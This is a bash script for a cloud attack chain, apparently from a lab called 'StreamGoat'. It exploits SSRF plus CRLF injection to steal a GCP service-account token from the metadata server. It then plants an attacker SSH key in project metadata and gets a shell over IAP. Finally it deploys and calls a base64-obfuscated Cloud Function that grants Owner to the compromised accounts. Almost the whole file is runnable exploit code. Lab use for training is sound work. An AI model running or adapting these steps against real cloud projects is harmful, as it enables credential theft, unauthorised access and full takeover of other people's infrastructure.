#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 2              ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Exploitation of Web RCE, metadata stealing\n"
  printf "  • Step 2. Permission enumeration for stolen metadata\n"
  printf "  • Step 3. Access via compute.instances.setMetadata\n"
  printf "  • Step 4. Review Role and Permissions assigned on VMb\n"
  printf "  • Step 5. Cloud function execution and new privs verification\n"
  printf "  • Step 6. Removing items we created during compromitation\n"

}
banner

#############################################
# Preflight checks (no changes to your logic)
#############################################
step "Preflight checks"
missing=0
for c in gcloud curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true

#############################################
# Step 1. Exploitation of Web RCE, metadata stealing
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploitation of Web RCE, metadata stealing  ===" "${RESET}"
is_valid_ipv4() {
  local ip="$1" o1 o2 o3 o4
  [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
  IFS='.' read -r o1 o2 o3 o4 <<<"$ip"
  for o in "$o1" "$o2" "$o3" "$o4"; do
    [[ $o =~ ^[0-9]+$ ]] && (( o >= 0 && o <= 255 )) || return 1
  done
  return 0
}

# ---- Prompt + IP format validation loop (keeps asking until valid) ----
step "Target selection"
while :; do
  read -r -p "Enter IP of vulnerable application: " TARGET_IP
  if is_valid_ipv4 "$TARGET_IP"; then
    ok "IP format looks valid: $TARGET_IP"
    break
  else
    err "Invalid IPv4 address. Expected dotted quad (e.g., 203.0.113.10). Try again."
  fi
done

TARGET="http://$TARGET_IP/fetch"

# ---- Connectivity check: require HTTP 200 on /cmd?c=id ----
step "Probing $TARGET for SSRF reachability (expects HTTP 200)"
spin_start "Sending test request (url=http://127.0.0.1)"
set +e
HTTP_CODE="$(curl -sS -m 8 --connect-timeout 4 -o /dev/null -w "%{http_code}" \
                  -G --data-urlencode url=http://127.0.0.1 "$TARGET")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "curl failed (exit $CURL_RC). Check SG/NACL/route/DNS."
  exit 1
fi
if [ "$HTTP_CODE" != "200" ]; then
  err "Endpoint responded with HTTP $HTTP_CODE (expected 200). Aborting."
  exit 1
fi
ok "SSRF endpoint reachable (HTTP 200) — proceeding."

step "Verification of exploitation SSRF + CRLF (adding extra header 'Metadata-Flavor: Google')"
# Fetch creds JSON from the target (same logic you used), safely URL-encoded via stdin
ok "Requesting IMDS from http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
TOKEN_JSON="$(curl -sG $TARGET?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\%0D\%0AMetadata-Flavor:\%20Google)"

ACCESS_TOKEN="$(echo "$TOKEN_JSON" | jq -r '.access_token')"
EXPIRES_IN="$(echo "$TOKEN_JSON" | jq -r '.expires_in')"

PROJECT_ID="$(curl -sG $TARGET?url=http://metadata.google.internal/computeMetadata/v1/project/project-id\%0D\%0AMetadata-Flavor:\%20Google)"

PROJECT_ID="$(echo "$PROJECT_ID" | tr -d '\r\n')"
[ -n "$PROJECT_ID" ] || { echo "[ERR] failed to retrieve project id"; exit 5; }

CFG="streamgoat-scenario-2"

if gcloud config configurations describe "$CFG" >/dev/null 2>&1; then
  gcloud config configurations activate "$CFG" >/dev/null 2>&1
else
  gcloud config configurations create "$CFG" >/dev/null 2>&1
  gcloud config configurations activate "$CFG" >/dev/null 2>&1
fi
gcloud config set project "$PROJECT_ID" --configuration="$CFG" >/dev/null 2>&1

# write helper env file that exports the token for using gcloud as the VM SA
mkdir -p "/tmp/.streamgoat"
ENVFILE="/tmp/.streamgoat/${CFG}.env"
printf "export CLOUDSDK_AUTH_ACCESS_TOKEN='%s'\n" "$ACCESS_TOKEN" > "$ENVFILE"
printf "export GOOGLE_ACCESS_TOKEN='%s'\n" "$ACCESS_TOKEN" >> "$ENVFILE"
printf "export CLOUDSDK_ACTIVE_CONFIG_NAME='%s'\n" "$CFG" >> "$ENVFILE"
printf "export STREAMGOAT_PROJECT='%s'\n" "$PROJECT_ID" >> "$ENVFILE"
printf "export CLOUDSDK_CORE_DISABLE_PROMPTS=1\n" "$PROJECT_ID" >> "$ENVFILE"
printf 'export CLOUDSDK_PAGER=""\n' "$PROJECT_ID" >> "$ENVFILE"
chmod 600 "$ENVFILE"

printf "\n"
ok "Identified project_id = ${YELLOW}${PROJECT_ID}${RESET}. Configuration ${YELLOW}${CFG}${RESET} is set and stored in ${YELLOW}${ENVFILE}${RESET}"

read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 2: Permission enumeration for stolen metadata
################################################################################

printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for stolen metadata  ===" "${RESET}"

try() {
  local desc="$1"; shift
  local rc
  set +e
  "$@" >/dev/null 2>&1
  rc=$?
  set -e
  if [ $rc -eq 0 ]; then
    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
  else
    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
  fi
}

printf "GCP tokens work a bit different comparing with AWS but similar to Azure. We may check the area of possible token usage (scope) via requesting tokeninfo.\n"
source $ENVFILE
curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${GOOGLE_ACCESS_TOKEN}"   | jq
printf "\nOur scope is ${YELLOW}'cloud-platform'${RESET}. It gives us permissions to interact with any GCP API which means we may try to enumerate permisions in for every existed services.\n\n"

try "Compute: list instances" gcloud compute instances list
gcloud compute instances list --filter="name~^streamgoat"
try "Compute: get instances info" gcloud compute instances describe streamgoat-vm-a --zone="us-central1-a"
try "IAM: list service-accounts" gcloud iam service-accounts list
try "Functions: list functions" gcloud functions list
try "Buckets: list buckets" gcloud storage buckets list
try "Logging: list sinks" gcloud logging sinks list
try "Secrets: list secrets" gcloud secrets list
try "App services: list app services" gcloud app services list
try "Pubsub: list topics" gcloud pubsub topics list
try "BigQuery: list datasets" gcloud bigquery datasets list
try "CloudSQL: list sql instances" gcloud sql instances list


printf "\nDuring recon and initial priv enumiration new compute resource was detected - ${YELLOW}streamgoat-vm-b${RESET}\n"
read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Upload SSH key via setCommonInstanceMetadata
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Access via compute.instances.setMetadata  ===" "${RESET}"

printf "\nOn step 2 we identified a few 'list' privilegies for compute service. Now we will try to check if we may modify MetaData to get access to the hosts.\n"

KEY_DIR="/tmp/.streamgoat"
KEY_FILE="${KEY_DIR}/temp_ssh_key"
PUB_FILE="${KEY_FILE}.pub"

step "Generating temporary SSH key in $KEY_DIR"
ssh-keygen -t ed25519 -N '' -f "$KEY_FILE" -q
ok "SSH key generated: $PUB_FILE"

step "Attempt to upload SSH key to instance metadata"
# Construct SSH metadata value: <user>:<key>
OS_USER="streamgoat_attacker"
SSH_METADATA="${OS_USER}:$(cat "$PUB_FILE")"

printf "${MAGENTA}[>] Attempting to update MetaData and upload SSH key${RESET}\n"
spin_start ""
set +e
gcloud compute instances add-metadata streamgoat-vm-b --zone="us-central1-a" --metadata="ssh-keys=${SSH_METADATA}"
SSH_UPLOAD=$?
set -e
spin_stop

if [ "$SSH_UPLOAD" -eq 0 ]; then
  ok  "MetaData successfully updated!"
else
  err "MetaData wasn't updated"
fi

read -r -p "We can not upload ssh-key into metadata of instance but let's check if there is a chance to modify project level metadata and get RCE via ${YELLOW}'roles/compute.osLogin'${RESET} permission. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
printf "\n"
printf "${MAGENTA}[>] Attempting to update Project MetaData and upload SSH key${RESET}\n"
spin_start ""
set +e
gcloud compute project-info add-metadata --metadata="ssh-keys=${SSH_METADATA}"
SSH_UPLOAD=$?
set -e
spin_stop

if [ "$SSH_UPLOAD" -eq 0 ]; then
  ok  "Project MetaData successfully updated!"
else
  err "Project MetaData wasn't updated"
fi

step "Verifying command execution on private virtual machine via Google IAP tunneling"
spin_start "Attempting SSH connection and running id, hostname"
set +e
SSH_OUTPUT=$(gcloud compute ssh streamgoat_attacker@streamgoat-vm-b --tunnel-through-iap --verbosity=error --quiet --ssh-key-file=$KEY_FILE --zone="us-central1-a" --command='echo -n "id: " && id && echo -n "hostname: " && hostname' 2>&1)
SSH_RC=$?
set -e
spin_stop

if [ "$SSH_RC" -eq 0 ]; then
  ok "SSH access verified — output below:"
  printf "%s\n" "$SSH_OUTPUT"
else
  err "SSH failed (exit code: $SSH_RC)"
  echo "$SSH_OUTPUT"
  exit 8
fi

read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Review Role and Permissions assigned on VMb
#############################################

printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Review Role and Permissions assigned on VMb  ===" "${RESET}"

printf "\nLet's use same method of permission enumirations we did on step 2 for VMa.\n"

gcloud compute ssh streamgoat_attacker@streamgoat-vm-b --tunnel-through-iap --verbosity=error --quiet --ssh-key-file=$KEY_FILE --zone="us-central1-a" --command='echo "dHJ5KCkgewogIGxvY2FsIGRlc2M9IiQxIjsgc2hpZnQKICBsb2NhbCBvdXRwdXQKICBzZXQgK2UKICBvdXRwdXQ9JCgiJEAiIDI+JjEpCiAgcmM9JD8KICBzZXQgLWUKICBpZiBbWyAkcmMgLWVxIDAgJiYgJG91dHB1dCAhPSAqIlJlcXVpcmVkIiogXV07IHRoZW4KICAgIHByaW50ZiAiWyVzXSBbT0tdICAgICVzXG4iICIkKGRhdGUgKyVIOiVNOiVTKSIgIiRkZXNjIgogIGVsc2UKICAgIHByaW50ZiAiWyVzXSBbREVOWV0gICVzXG4iICIkKGRhdGUgKyVIOiVNOiVTKSIgIiRkZXNjIgogIGZpCn0KCnRyeSAiQ29tcHV0ZTogbGlzdCBpbnN0YW5jZXMiIGdjbG91ZCBjb21wdXRlIGluc3RhbmNlcyBsaXN0CnRyeSAiQ29tcHV0ZTogZ2V0IGluc3RhbmNlcyBpbmZvIiBnY2xvdWQgY29tcHV0ZSBpbnN0YW5jZXMgZGVzY3JpYmUgc3RyZWFtZ29hdC12bS1hIC0tem9uZT0idXMtY2VudHJhbDEtYSIKdHJ5ICJJQU06IGxpc3Qgc2VydmljZS1hY2NvdW50cyIgZ2Nsb3VkIGlhbSBzZXJ2aWNlLWFjY291bnRzIGxpc3QKZ2Nsb3VkIGlhbSBzZXJ2aWNlLWFjY291bnRzIGxpc3QgLS1maWx0ZXI9ImVtYWlsOnN0cmVhbWdvYXQiIC0tZm9ybWF0PSJ0YWJsZShlbWFpbCwgZGlzcGxheU5hbWUpIgp0cnkgIkZ1bmN0aW9uczogbGlzdCBmdW5jdGlvbnMiIGdjbG91ZCBmdW5jdGlvbnMgbGlzdApnY2xvdWQgZnVuY3Rpb25zIGxpc3QgLS1maWx0ZXI9Im5hbWU6c3RyZWFtZ29hdCIKdHJ5ICJCdWNrZXRzOiBsaXN0IGJ1Y2tldHMiIGdjbG91ZCBzdG9yYWdlIGJ1Y2tldHMgbGlzdAp0cnkgIkxvZ2dpbmc6IGxpc3Qgc2lua3MiIGdjbG91ZCBsb2dnaW5nIHNpbmtzIGxpc3QKdHJ5ICJTZWNyZXRzOiBsaXN0IHNlY3JldHMiIGdjbG91ZCBzZWNyZXRzIGxpc3QKdHJ5ICJBcHAgc2VydmljZXM6IGxpc3QgYXBwIHNlcnZpY2VzIiBnY2xvdWQgYXBwIHNlcnZpY2VzIGxpc3QKdHJ5ICJQdWJzdWI6IGxpc3QgdG9waWNzIiBnY2xvdWQgcHVic3ViIHRvcGljcyBsaXN0CnRyeSAiQmlnUXVlcnk6IGxpc3QgZGF0YXNldHMiIGdjbG91ZCBiaWdxdWVyeSBkYXRhc2V0cyBsaXN0CnRyeSAiQ2xvdWRTUUw6IGxpc3Qgc3FsIGluc3RhbmNlcyIgZ2Nsb3VkIHNxbCBpbnN0YW5jZXMgbGlzdAo=" | base64 -d | bash' 2>&1

printf "\nWe may notice new set of permissions given: list IAM roles and list fuctions. There is a posiblity that it isn't just list operation but wildcard roles which may allow create/invoke funcitons and which is more important assign a Service Account to this function. In our enumeration we see that there is some SA called 'owner'. It may has full admin permissions udner the project.\nTo sum up, our plan is:\n  1. Create function which will assign Owner role to Service Account we already control (assigned to VMa and VMb)\n  2. Set 'streamgoat-owner-sa' Service Account to this function\n  3. Execute the function\n  4. Check if VMa permisions got changed\n\n"

printf "${MAGENTA}[>] Attempting to create function${RESET}\n"
spin_start ""
set +e
gcloud compute ssh streamgoat_attacker@streamgoat-vm-b --tunnel-through-iap --verbosity=error --quiet --ssh-key-file=$KEY_FILE --zone="us-central1-a" --command='echo "aW1wb3J0IGZ1bmN0aW9uc19mcmFtZXdvcmsKZnJvbSBnb29nbGVhcGljbGllbnQgaW1wb3J0IGRpc2NvdmVyeQppbXBvcnQgZ29vZ2xlLmF1dGgKCkBmdW5jdGlvbnNfZnJhbWV3b3JrLmh0dHAKZGVmIGVsZXZhdGVfc2VydmljZV9hY2NvdW50cyhyZXF1ZXN0KToKICAgIHByb2plY3RfaWQgPSAiQUFBQUEtdG8tYmUtcmVwbGFjZWQtQUFBQUEiCiAgICB0YXJnZXRzID0gWwogICAgICAgIGYic2VydmljZUFjY291bnQ6c3RyZWFtZ29hdC12bWEtc2FAe3Byb2plY3RfaWR9LmlhbS5nc2VydmljZWFjY291bnQuY29tIiwKICAgICAgICBmInNlcnZpY2VBY2NvdW50OnN0cmVhbWdvYXQtdm1iLXNhQHtwcm9qZWN0X2lkfS5pYW0uZ3NlcnZpY2VhY2NvdW50LmNvbSIKICAgIF0KCiAgICBjcmVkZW50aWFscywgXyA9IGdvb2dsZS5hdXRoLmRlZmF1bHQoKQogICAgY3JtX3NlcnZpY2UgPSBkaXNjb3ZlcnkuYnVpbGQoImNsb3VkcmVzb3VyY2VtYW5hZ2VyIiwgInYxIiwgY3JlZGVudGlhbHM9Y3JlZGVudGlhbHMpCgogICAgcG9saWN5ID0gY3JtX3NlcnZpY2UucHJvamVjdHMoKS5nZXRJYW1Qb2xpY3kocmVzb3VyY2U9cHJvamVjdF9pZCwgYm9keT17fSkuZXhlY3V0ZSgpCgogICAgYmluZGluZ3MgPSBwb2xpY3kuZ2V0KCJiaW5kaW5ncyIsIFtdKQoKICAgICMgQ2hlY2sgaWYgYWxyZWFkeSBhZGRlZAogICAgb3duZXJfYmluZGluZyA9IG5leHQoKGIgZm9yIGIgaW4gYmluZGluZ3MgaWYgYlsicm9sZSJdID09ICJyb2xlcy9vd25lciIpLCBOb25lKQogICAgaWYgbm90IG93bmVyX2JpbmRpbmc6CiAgICAgICAgb3duZXJfYmluZGluZyA9IHsicm9sZSI6ICJyb2xlcy9vd25lciIsICJtZW1iZXJzIjogW119CiAgICAgICAgYmluZGluZ3MuYXBwZW5kKG93bmVyX2JpbmRpbmcpCgogICAgZm9yIHRhcmdldCBpbiB0YXJnZXRzOgogICAgICAgIGlmIHRhcmdldCBub3QgaW4gb3duZXJfYmluZGluZ1sibWVtYmVycyJdOgogICAgICAgICAgICBvd25lcl9iaW5kaW5nWyJtZW1iZXJzIl0uYXBwZW5kKHRhcmdldCkKCiAgICAjIFNldCB1cGRhdGVkIHBvbGljeQogICAgc2V0X3BvbGljeV9yZXF1ZXN0ID0gewogICAgICAgICJwb2xpY3kiOiB7CiAgICAgICAgICAgICJiaW5kaW5ncyI6IGJpbmRpbmdzLAogICAgICAgICAgICAiZXRhZyI6IHBvbGljeS5nZXQoImV0YWciKQogICAgICAgIH0KICAgIH0KCiAgICBjcm1fc2VydmljZS5wcm9qZWN0cygpLnNldElhbVBvbGljeShyZXNvdXJjZT1wcm9qZWN0X2lkLCBib2R5PXNldF9wb2xpY3lfcmVxdWVzdCkuZXhlY3V0ZSgpCgogICAgcmV0dXJuICJTdWNjZXNzOiBFbGV2YXRlZCByb2xlcyBmb3IgdGFyZ2V0IHNlcnZpY2UgYWNjb3VudHNcbiIK" | base64 -d > main.py && PROJECT_ID=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id") && sed -i "s/AAAAA-to-be-replaced-AAAAA/${PROJECT_ID}/g" main.py && echo "ZnVuY3Rpb25zLWZyYW1ld29yawpnb29nbGUtYXBpLXB5dGhvbi1jbGllbnQKZ29vZ2xlLWF1dGgK" | base64 -d > requirements.txt && gcloud functions deploy streamgoat-escalation --quiet --verbosity=none --runtime=python311 --trigger-http --entry-point=elevate_service_accounts --region=us-central1 --service-account=streamgoat-owner-sa@${PROJECT_ID}.iam.gserviceaccount.com --no-allow-unauthenticated >/dev/null 2>&1' 2>&1
FUNC_CREATION=$?
set -e
spin_stop

if [ "$FUNC_CREATION" -eq 0 ]; then
  ok  "Seems to be success!"
else
  err "Failed"
fi

step "Verifying new function created"
spin_start "Attempting SSH connection and running id, hostname"
set +e
FUNC_CHECK=$(gcloud compute ssh streamgoat_attacker@streamgoat-vm-b --tunnel-through-iap --verbosity=error --quiet --ssh-key-file=$KEY_FILE --zone="us-central1-a" --command='gcloud functions list --filter="name:streamgoat"' 2>&1)
FUNC_CHECK_CODE=$?
set -e
spin_stop

if [ "$FUNC_CHECK_CODE" -eq 0 ]; then
  ok "Function has been created:"
  printf "%s\n\n" "$FUNC_CHECK"
else
  err "Function creation failed (exit code: $FUNC_CHECK_CODE)"
  echo "$FUNC_CHECK"
  exit 8
fi

read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 5. Cloud function execution and new privs verification
#############################################

printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Cloud function execution and new privs verification  ===" "${RESET}"

printf "\nWe are going to assign Onwer role to Service Accounts we already controlled: ${YELLOW}streamgoat-vma-sa${RESET} and ${YELLOW}streamgoat-vmb-sa${RESET}\n"

step "Cloud function execution"
spin_start "Attempting to execute function"
set +e
FUNC_EXEC=$(gcloud compute ssh streamgoat_attacker@streamgoat-vm-b --tunnel-through-iap --verbosity=error --quiet --ssh-key-file=$KEY_FILE --zone="us-central1-a" --command='gcloud functions call streamgoat-escalation' 2>&1)
FUNC_EXEC_CODE=$?
set -e
spin_stop

if [ "$FUNC_EXEC_CODE" -eq 0 ]; then
  ok "Function has been executed:"
  printf "%s\n\n" "$FUNC_EXEC"
  read -r -p "Now we should become an Owner of the project. Let's verify our permisions via the same enumiration method we did on step 2. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
else
  err "Function execution failed (exit code: $FUNC_EXEC_CODE)"
  echo "$FUNC_EXEC"
  exit 8
fi

step "Verification of new permissions"
try "Compute: list instances" gcloud compute instances list
try "Compute: get instances info" gcloud compute instances describe streamgoat-vm-a --zone="us-central1-a"
try "IAM: list service-accounts" gcloud iam service-accounts list
try "Functions: list functions" gcloud functions list
try "Buckets: list buckets" gcloud storage buckets list
try "Logging: list sinks" gcloud logging sinks list
try "Secrets: list secrets" gcloud secrets list
try "Pubsub: list topics" gcloud pubsub topics list
try "CloudSQL: list sql instances" gcloud sql instances list

read -r -p "Step 5 is completed. We are Owner. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

# ==============
# Cleanup
# ==============

printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Removing items we created during compromitation (metadata, cloud function, local temporary files)  ===" "${RESET}"

set +e
step "Removing ssh-key we created on project metadata level (for user streamgoat_attacker)"
gcloud compute project-info describe --format="get(commonInstanceMetadata.items[ssh-keys])" > /tmp/.streamgoat/all-ssh-keys.txt
grep -v "^streamgoat_attacker:" /tmp/.streamgoat/all-ssh-keys.txt > /tmp/.streamgoat/filtered-ssh-keys.txt
gcloud compute project-info add-metadata --quiet --metadata-from-file ssh-keys=/tmp/.streamgoat/filtered-ssh-keys.txt

step "Removing cloud function we created (streamgoat-escalation)"
gcloud functions delete streamgoat-escalation --quiet

step "Removing localy stored file in /tmp/.streamgoat"
rm -rf /tmp/.streamgoat
set -e
